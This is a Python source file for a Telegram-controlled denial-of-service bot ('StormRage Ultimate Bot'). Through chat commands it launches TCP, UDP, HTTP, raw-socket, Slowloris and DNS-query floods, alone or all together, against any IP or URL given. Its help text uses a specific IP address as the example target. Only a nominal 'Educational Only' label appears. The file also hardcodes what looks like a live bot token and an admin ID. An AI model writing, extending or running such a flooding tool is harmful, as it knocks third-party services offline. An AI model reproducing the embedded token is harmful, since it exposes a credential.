import socket
import threading
import requests
import random
import time
import asyncio
import aiohttp
import ssl
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8957381735:AAE1OMZgYPQu5xqGmly3unK-ZL6IkraPDBQ"
ADMIN_IDS = [7898928200]

# HIGH PERFORMANCE SETTINGS
MAX_THREADS = 5000  # Maximum threads
BATCH_SIZE = 100    # Batch process
RATE_LIMIT = 0.0001 # Almost no delay

# Active attacks
active_attacks = {}
attack_stats = {}
last_update_id = 0

# Thread pool
executor = ThreadPoolExecutor(max_workers=MAX_THREADS)

print("=" * 60)
print("🔥 STORMRAGE ULTIMATE BOT - MAX POWER MODE 🔥")
print(f"Bot Token: {BOT_TOKEN[:10]}...")
print(f"Max Threads: {MAX_THREADS}")
print("=" * 60)

# ==================== TELEGRAM API ====================
def tg_request(method, params=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        if params:
            r = requests.post(url, json=params, timeout=15)
        else:
            r = requests.get(url, timeout=15)
        return r.json()
    except:
        return {"ok": False}

def send_message(chat_id, text):
    try:
        return tg_request("sendMessage", {"chat_id": chat_id, "text": text})
    except:
        return None

def get_updates(offset=None):
    params = {"timeout": 30}
    if offset:
        params["offset"] = offset
    return tg_request("getUpdates", params)

# ==================== POWERFUL ATTACK METHODS ====================

# 1. TCP FLOOD - Connection exhaustion
def tcp_flood(ip, port, chat_id, stop_event):
    sockets = []
    while not stop_event.is_set():
        try:
            # Create multiple sockets
            for _ in range(10):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(0.5)
                sock.connect((ip, port))
                sock.send(random._urandom(65535))
                sockets.append(sock)
            
            # Keep connections alive
            while len(sockets) > 100:
                try:
                    sockets.pop().close()
                except:
                    pass
            
            with threading.Lock():
                attack_stats[chat_id] = attack_stats.get(chat_id, 0) + 10
                
        except:
            pass

# 2. UDP FLOOD - Bandwidth killer
def udp_flood(ip, port, chat_id, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    packet = random._urandom(65535)
    
    while not stop_event.is_set():
        try:
            for _ in range(100):
                sock.sendto(packet, (ip, port))
            with threading.Lock():
                attack_stats[chat_id] = attack_stats.get(chat_id, 0) + 100
        except:
            pass

# 3. HTTP/HTTPS FLOOD - Layer 7 killer
def http_flood(url, chat_id, stop_event):
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Mobile/15E148',
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'Mozilla/5.0 (Linux; Android 13) Chrome/119.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36'
    ]
    
    session = requests.Session()
    while not stop_event.is_set():
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }
            
            # Mixed requests
            if random.choice([True, False]):
                session.get(url, headers=headers, timeout=2, verify=False)
            else:
                session.post(url, headers=headers, data={'x': 'a'*1024}, timeout=2, verify=False)
                
            with threading.Lock():
                attack_stats[chat_id] = attack_stats.get(chat_id, 0) + 1
        except:
            pass

# 4. SYN FLOOD - Raw packet attack
def syn_flood(ip, port, chat_id, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            for _ in range(100):
                packet = random._urandom(40)
                sock.sendto(packet, (ip, port))
                
            with threading.Lock():
                attack_stats[chat_id] = attack_stats.get(chat_id, 0) + 100
        except:
            pass

# 5. SLOWLORIS - Connection holder
def slowloris_flood(ip, port, chat_id, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
            
            # Hold connection
            for i in range(500):
                if stop_event.is_set():
                    break
                sock.send(f"X-Keep-Alive: {i}\r\n".encode())
                time.sleep(random.uniform(2, 5))
            sock.close()
        except:
            pass

# 6. AMPLIFICATION - DNS/NTP amplification
def amp_flood(ip, port, chat_id, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # DNS query (small request, big response)
    dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
    
    while not stop_event.is_set():
        try:
            for _ in range(50):
                sock.sendto(dns_query, (ip, 53))
            with threading.Lock():
                attack_stats[chat_id] = attack_stats.get(chat_id, 0) + 50
        except:
            pass

# ==================== ATTACK MANAGER ====================

def start_attack(chat_id, attack_type, target, port, threads):
    # Stop existing
    if chat_id in active_attacks and active_attacks[chat_id]:
        active_attacks[chat_id].set()
        time.sleep(0.5)
    
    stop_event = threading.Event()
    active_attacks[chat_id] = stop_event
    attack_stats[chat_id] = 0
    
    # Limit threads but keep powerful
    threads = min(threads, 2000)
    
    print(f"Starting {attack_type} attack on {target}:{port} with {threads} threads")
    
    if attack_type == "tcp":
        for _ in range(threads):
            executor.submit(tcp_flood, target, port, chat_id, stop_event)
    elif attack_type == "udp":
        for _ in range(threads):
            executor.submit(udp_flood, target, port, chat_id, stop_event)
    elif attack_type == "http":
        for _ in range(threads):
            executor.submit(http_flood, target, chat_id, stop_event)
    elif attack_type == "syn":
        for _ in range(threads):
            executor.submit(syn_flood, target, port, chat_id, stop_event)
    elif attack_type == "slow":
        for _ in range(threads):
            executor.submit(slowloris_flood, target, port, chat_id, stop_event)
    elif attack_type == "amp":
        for _ in range(threads):
            executor.submit(amp_flood, target, port, chat_id, stop_event)
    elif attack_type == "all":
        # ULTIMATE MODE - All attacks at once
        t = max(1, threads // 6)
        for _ in range(t):
            executor.submit(tcp_flood, target, port, chat_id, stop_event)
            executor.submit(udp_flood, target, port, chat_id, stop_event)
            executor.submit(http_flood, f"http://{target}", chat_id, stop_event)
            executor.submit(syn_flood, target, port, chat_id, stop_event)
            executor.submit(slowloris_flood, target, port, chat_id, stop_event)
            executor.submit(amp_flood, target, port, chat_id, stop_event)
    
    return True

def stop_attack(chat_id):
    if chat_id in active_attacks and active_attacks[chat_id]:
        active_attacks[chat_id].set()
        active_attacks[chat_id] = None
        return True
    return False

def get_stats(chat_id):
    if chat_id in attack_stats:
        return attack_stats[chat_id]
    return 0

# ==================== BOT COMMANDS ====================

def cmd_start(chat_id, user_id):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    
    msg = """🔥 *STORMRAGE ULTIMATE BOT* 🔥

*⚡ POWERFUL ATTACKS:*

/tcp IP PORT THREADS - TCP Flood
/udp IP PORT THREADS - UDP Flood  
/http URL THREADS - HTTP/HTTPS Flood
/syn IP PORT THREADS - SYN Flood
/slow IP PORT THREADS - Slowloris
/amp IP PORT THREADS - Amplification
/all IP PORT THREADS - 🔥 ALL ATTACKS 🔥

*🛑 CONTROL:*
/stop - Stop Attack
/stats - Attack Statistics

*📝 EXAMPLES:*
/tcp 185.31.40.28 80 1000
/udp 185.31.40.28 80 1000
/http http://example.com 1000
/all 185.31.40.28 80 500

⚠️ *Educational Only* | Max 2000 threads"""
    
    send_message(chat_id, msg)

def cmd_tcp(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 3:
        send_message(chat_id, "Usage: /tcp IP PORT THREADS")
        return
    try:
        ip, port, threads = args[0], int(args[1]), min(int(args[2]), 2000)
        start_attack(chat_id, "tcp", ip, port, threads)
        send_message(chat_id, f"✅ *TCP FLOOD STARTED*\nTarget: {ip}:{port}\nThreads: {threads}\nStatus: 🔴 ATTACKING")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_udp(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 3:
        send_message(chat_id, "Usage: /udp IP PORT THREADS")
        return
    try:
        ip, port, threads = args[0], int(args[1]), min(int(args[2]), 2000)
        start_attack(chat_id, "udp", ip, port, threads)
        send_message(chat_id, f"✅ *UDP FLOOD STARTED*\nTarget: {ip}:{port}\nThreads: {threads}\nStatus: 🔴 ATTACKING")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_http(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 2:
        send_message(chat_id, "Usage: /http URL THREADS")
        return
    try:
        url, threads = args[0], min(int(args[1]), 2000)
        start_attack(chat_id, "http", url, 0, threads)
        send_message(chat_id, f"✅ *HTTP FLOOD STARTED*\nTarget: {url}\nThreads: {threads}\nStatus: 🔴 ATTACKING")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_syn(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 3:
        send_message(chat_id, "Usage: /syn IP PORT THREADS")
        return
    try:
        ip, port, threads = args[0], int(args[1]), min(int(args[2]), 2000)
        start_attack(chat_id, "syn", ip, port, threads)
        send_message(chat_id, f"✅ *SYN FLOOD STARTED*\nTarget: {ip}:{port}\nThreads: {threads}\nStatus: 🔴 ATTACKING")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_slow(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 3:
        send_message(chat_id, "Usage: /slow IP PORT THREADS")
        return
    try:
        ip, port, threads = args[0], int(args[1]), min(int(args[2]), 1000)
        start_attack(chat_id, "slow", ip, port, threads)
        send_message(chat_id, f"✅ *SLOWLORIS STARTED*\nTarget: {ip}:{port}\nThreads: {threads}\nStatus: 🔴 HOLDING")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_amp(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 3:
        send_message(chat_id, "Usage: /amp IP PORT THREADS")
        return
    try:
        ip, port, threads = args[0], int(args[1]), min(int(args[2]), 2000)
        start_attack(chat_id, "amp", ip, port, threads)
        send_message(chat_id, f"✅ *AMPLIFICATION STARTED*\nTarget: {ip}:{port}\nThreads: {threads}\nStatus: 🔴 AMPLIFYING")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_all(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 3:
        send_message(chat_id, "Usage: /all IP PORT THREADS")
        return
    try:
        ip, port, threads = args[0], int(args[1]), min(int(args[2]), 1500)
        start_attack(chat_id, "all", ip, port, threads)
        send_message(chat_id, f"💀 *ULTIMATE ATTACK STARTED* 💀\nTarget: {ip}:{port}\nThreads per method: {threads//6}\nStatus: 🔥 MULTI-VECTOR 🔥")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_stop(chat_id, user_id):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if stop_attack(chat_id):
        packets = get_stats(chat_id)
        send_message(chat_id, f"🛑 *ATTACK STOPPED*\nTotal Packets: {packets:,}\nStatus: 🟢 IDLE")
    else:
        send_message(chat_id, "⚠️ No active attack")

def cmd_stats(chat_id, user_id):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    packets = get_stats(chat_id)
    is_running = chat_id in active_attacks and active_attacks[chat_id] and not active_attacks[chat_id].is_set()
    status = "🔴 ATTACKING" if is_running else "🟢 IDLE"
    send_message(chat_id, f"📊 *ATTACK STATISTICS*\n\nPackets Sent: `{packets:,}`\nStatus: {status}\n\nUse /stop to halt attack")

# ==================== MAIN ====================
def main():
    global last_update_id
    
    print("🤖 Starting StormRage Ultimate Bot...")
    print(f"Max Threads: {MAX_THREADS}")
    print(f"Thread Pool: {executor._max_workers}")
    
    # Test connection
    test = tg_request("getMe")
    if test.get("ok"):
        bot_info = test.get("result", {})
        print(f"✅ Connected: @{bot_info.get('username', 'unknown')}")
        
        # Notify admin
        for admin in ADMIN_IDS:
            send_message(admin, "✅ *StormRage Bot ONLINE*\nMax Power Mode Activated")
    else:
        print(f"❌ Connection failed")
        return
    
    print("✅ Bot running! Waiting for commands...")
    
    while True:
        try:
            response = get_updates(last_update_id + 1 if last_update_id else None)
            
            if response.get("ok") and response.get("result"):
                for update in response["result"]:
                    last_update_id = update["update_id"]
                    
                    if "message" in update:
                        msg = update["message"]
                        chat_id = msg["chat"]["id"]
                        user_id = msg["from"]["id"]
                        text = msg.get("text", "").strip()
                        
                        if not text.startswith("/"):
                            continue
                        
                        parts = text.split()
                        command = parts[0].lower()
                        args = parts[1:]
                        
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] {command}")
                        
                        if command == "/start":
                            cmd_start(chat_id, user_id)
                        elif command == "/tcp":
                            cmd_tcp(chat_id, user_id, args)
                        elif command == "/udp":
                            cmd_udp(chat_id, user_id, args)
                        elif command == "/http":
                            cmd_http(chat_id, user_id, args)
                        elif command == "/syn":
                            cmd_syn(chat_id, user_id, args)
                        elif command == "/slow":
                            cmd_slow(chat_id, user_id, args)
                        elif command == "/amp":
                            cmd_amp(chat_id, user_id, args)
                        elif command == "/all":
                            cmd_all(chat_id, user_id, args)
                        elif command == "/stop":
                            cmd_stop(chat_id, user_id)
                        elif command == "/stats":
                            cmd_stats(chat_id, user_id)
                        else:
                            send_message(chat_id, "Unknown command. Send /start")
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()